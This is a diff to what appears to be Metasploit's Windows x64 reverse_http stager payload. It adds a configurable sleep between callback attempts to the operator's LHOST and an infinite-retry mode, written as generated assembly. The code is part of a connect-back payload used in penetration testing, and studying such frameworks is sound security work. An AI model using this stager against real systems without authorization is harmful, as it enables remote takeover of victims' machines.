@@ -29,7 +29,8 @@ module Payload::Windows::ReverseHttp_x64
     super
     register_advanced_options([
         OptInt.new('StagerURILength', [false, 'The URI length for the stager (at least 5 bytes)']),
-        OptInt.new('StagerRetryCount', [false, 'The number of times the stager should retry if the first connect fails', 10]),
+        OptInt.new('StagerRetryCount', [false, 'The number of times the stager should retry if the first connect fails (zero to infinite retries)', 10]),
+        OptInt.new('StagerRetryWait', [false, 'Number of seconds to wait for the stager between reconnect attempts', 5]),
         OptString.new('PayloadProxyHost', [false, 'An optional proxy server IP address or hostname']),
         OptPort.new('PayloadProxyPort', [false, 'An optional proxy server port']),
         OptString.new('PayloadProxyUser', [false, 'An optional proxy server username']),
@@ -52,7 +53,8 @@ module Payload::Windows::ReverseHttp_x64
       ssl:         opts[:ssl] || false,
       host:        ds['LHOST'],
       port:        ds['LPORT'],
-      retry_count: ds['StagerRetryCount']
+      retry_count: ds['StagerRetryCount'],
+      retry_wait: ds['StagerRetryWait']
     }
 
     # add extended options if we do have enough space
@@ -152,10 +154,12 @@ module Payload::Windows::ReverseHttp_x64
   # @option opts [String] :proxy_user The optional proxy server username
   # @option opts [String] :proxy_pass The optional proxy server password
   # @option opts [Integer] :retry_count The number of times to retry a failed request before giving up
+  # @option opts [Integer] :retry_wait The seconds to wait before retry a new request
   #
   def asm_reverse_http(opts={})
 
-    retry_count   = [opts[:retry_count].to_i, 1].max
+    retry_count   = opts[:retry_count].to_i
+    retry_wait   = opts[:retry_wait].to_i * 1000
     proxy_enabled = !!(opts[:proxy_host].to_s.strip.length > 0)
     proxy_info    = ""
 
@@ -320,14 +324,18 @@ module Payload::Windows::ReverseHttp_x64
         mov rsi, rax
     ^
 
-    if retry_count > 1
+    if retry_count > 0
       asm << %Q^
           push #{retry_count}
           pop rdi
-
-        retryrequest:
       ^
     end
+
+
+    asm << %Q^
+      retryrequest:
+    ^
+
 
     if opts[:ssl]
       asm << %Q^
@@ -358,9 +366,15 @@ module Payload::Windows::ReverseHttp_x64
         call rbp
         test eax, eax
         jnz allocate_memory
+           
+      set_wait:
+        mov rcx, #{retry_wait}        ; dwMilliseconds
+        mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'Sleep')}
+        call rbp                      ; Sleep( dwMilliseconds );
     ^
+    
 
-    if retry_count > 1
+    if retry_count > 0
       asm << %Q^
       try_it_again:
         dec rdi
@@ -369,7 +383,8 @@ module Payload::Windows::ReverseHttp_x64
       ^
     else
       asm << %Q^
-        jmp failure
+        jmp retryrequest
+        ; retry forever
       ^
     end
 
